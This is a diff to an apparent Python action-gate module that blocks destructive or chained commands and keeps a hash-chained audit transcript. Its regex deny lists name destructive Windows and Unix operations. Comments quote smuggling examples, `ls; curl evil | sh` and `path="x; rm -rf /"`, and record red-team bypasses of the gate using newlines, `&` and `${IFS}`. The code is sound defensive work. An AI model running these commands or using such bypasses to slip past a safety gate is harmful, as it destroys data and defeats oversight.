@@ -58,22 +58,32 @@ _DESTRUCTIVE = re.compile(
     r"\bshutdown\b|\breboot\b|>\s*/dev/sd|chmod\s+-r\s+000|"  # power / device overwrite
     r"os\.remove|os\.unlink|shutil\.rmtree|\.unlink\(|"  # python
     r"\bdrop\s+table\b|\btruncate\s+table\b|"  # sql
+    # verb-LESS destructive ops a red-team confirmed escape a shell-verb regex (no rm/del/format word):
+    r"\bvssadmin\s+delete\b|\bwbadmin\s+delete\b|\bwevtutil\s+cl\b|\bbcdedit\b|\btakeown\b|"  # backup/log/boot/own
+    r"\breg\s+delete\b|\bcipher\s+/w\b|\[io\.(?:file|directory)\]::delete|"  # registry / wipe-free-space / .NET
     r"\bwipe\b|:\(\)\s*\{)",  # wipe / fork bomb
     re.IGNORECASE,
 )
 
 # command chaining/piping lets a benign HEAD command smuggle an unauthorized tail past a head-only
-# allowlist (e.g. `ls; curl evil | sh`). Refuse it on any command-bearing string param.
-_CHAIN = re.compile(r";|\|\||&&|\||`|\$\(|>\s*/|<\s*/")
+# allowlist (e.g. `ls; curl evil | sh`). A red-team also smuggled tails via a newline, a single `&`,
+# and `${IFS}`, so those are refused too. Applied to COMMAND-bearing free-text params only -- NOT file
+# content or paths, where `;` `|` `&` `(` and newlines are legal data/filename characters.
+_CHAIN = re.compile(r";|\|\||\||&&|&|`|\$\(|\$\{|>\s*/|<\s*/|[\r\n]")
 
 # param keys that name a filesystem target -> always scope-checked even if the value has no slash
 _PATH_KEYS = {"path", "dest", "destination", "file", "filename", "dir", "directory", "target", "src", "source", "to"}
 
 
 def _looks_like_path(key: str, value: str) -> bool:
+    """True if this param denotes a filesystem path: a conventional path KEY, or a value that is a
+    single bare path. A multi-line or very long value is file CONTENT, not a path -- treating prose
+    that merely contains a '/' as a path would refuse saving any document with a slash in it."""
     if key.lower() in _PATH_KEYS:
         return True
     v = value.strip()
+    if "\n" in v or "\r" in v or len(v) > 260:  # a real path is one line within MAX_PATH
+        return False
     return ("/" in v) or ("\\" in v) or bool(re.match(r"^[a-zA-Z]:", v))
 
 
@@ -81,7 +91,14 @@ def _seal(rec: dict) -> str:
     """SHA-256 over the record (excluding the seal itself). The record carries a `_prev` field that
     binds the previous seal, so this hash is the link in a FORWARD CHAIN: rewriting any field breaks
     this hash, and reorder/insert/delete break the `_prev` linkage that verify() walks. default=str
-    keeps it robust to a non-serializable handler result."""
+    keeps it robust to a non-serializable handler result.
+
+    HONEST LIMIT (do not overclaim): this is an UNKEYED hash anchored on the in-memory `nonce`. It
+    detects accidental corruption and any tamper that does NOT re-chain (a partial edit, a reorder, an
+    insert, a delete) -- that is what verify() catches. It is NOT proof against a privileged in-process
+    attacker who can read `self.nonce` and recompute seals for the whole list; such a holder can forge a
+    consistent transcript. Tamper-evidence against the host needs the head seal anchored in an external
+    append-only sink, or an HMAC keyed by a secret the host never holds. This is integrity, not custody."""
     body = {k: v for k, v in rec.items() if k != "seal"}
     return hashlib.sha256(
         json.dumps(body, sort_keys=True, separators=(",", ":"), default=str).encode("utf-8")
@@ -137,17 +154,26 @@ class ActionRegistry:
         }
         if confirm:
             rec["confirm"] = str(confirm)  # record WHAT was approved (so the audit can show it)
-        # The DETERMINISTIC screens (scope/verb/chaining) run over EVERY string param -- a destructive
-        # path/payload in any key (e.g. save_file's `path`) must not slip past the gate. The L13 INTENT
-        # HEURISTIC runs only on the designated free-text field, because it false-positives on short
-        # structured values (a move id, an app name) -- the deterministic screens cover those.
+        # The DETERMINISTIC screens are scoped by what each param IS, so the gate stays a wall without
+        # refusing legitimate data (a confirmed bypass was that ONLY the text_param was screened, so a
+        # destructive PATH slipped through; the over-correction of screening EVERY param would refuse a
+        # file whose CONTENT merely contains a newline or the word "rm"). The split:
+        #   * SCOPE (protected/broad target): every path-bearing param -- the never-delete wall.
+        #   * DESTRUCTIVE verb: path-bearing params + the command field (catches `path="x; rm -rf /"`).
+        #   * CHAINING (; | & ( newline ...): the command field ONLY -- those are legal in filenames and
+        #     in file content, so they smuggle a tail only inside a shell-bound command string.
+        # The L13 INTENT HEURISTIC runs only on the designated free-text field (it false-positives on
+        # short structured values like a move id or an app name -- the deterministic screens cover those).
         strs = {k: v for k, v in params.items() if isinstance(v, str)}
-        text = str(params.get(action.text_param, "")) if (action and action.text_param) else ""
+        text_key = action.text_param if action else None
+        text = str(params.get(text_key, "")) if text_key else ""
         gate = _gate(text) if text.strip() else None
         rec["l13"] = "consulted" if gate is not None else ("n/a" if not text.strip() else "unavailable")
         scoped = [v for k, v in strs.items() if _looks_like_path(k, v) and (_is_broad_scope(v) or _is_system_path(v))]
-        destructive = [v for v in strs.values() if _DESTRUCTIVE.search(v)]
-        chained = [v for v in strs.values() if _CHAIN.search(v)]
+        destructive = [
+            v for k, v in strs.items() if (k.lower() in _PATH_KEYS or k == text_key) and _DESTRUCTIVE.search(v)
+        ]
+        chained = [v for k, v in strs.items() if k == text_key and _CHAIN.search(v)]
         if action is None:
             rec.update(decision="NO_ACTION", result="no action %r" % name)
         elif action.safety == "denied":
@@ -175,7 +201,10 @@ class ActionRegistry:
         return rec
 
     def verify(self) -> bool:
-        """Walk the forward chain: any reorder/insert/delete/rewrite breaks it."""
+        """Walk the forward chain from the session nonce: any reorder/insert/delete/rewrite that did not
+        re-chain breaks it. NOTE this re-derives from the readable `self.nonce`, so it proves internal
+        consistency + catches un-re-chained tampering -- it cannot detect a forger who re-chained the
+        whole list (see _seal's HONEST LIMIT). True host-tamper-evidence needs an external anchor/HMAC."""
         prev = self.nonce
         for r in self.transcript:
             if r.get("seal") != _seal(r) or r.get("_prev") != prev:
@@ -297,7 +326,9 @@ def default_registry() -> ActionRegistry:
             "button",
             "Save",
             save_file,
-            text_param="content",
+            # no text_param: a file's CONTENT is opaque data (it may legitimately contain newlines, "|",
+            # or the word "rm") -- save_file's protection is the SCOPE screen on `path`, not its content.
+            text_param=None,
         )
     )
     reg.register(Action("shutdown", "Power off (denied)", {}, "denied", "#power", "button", "Power", shutdown))
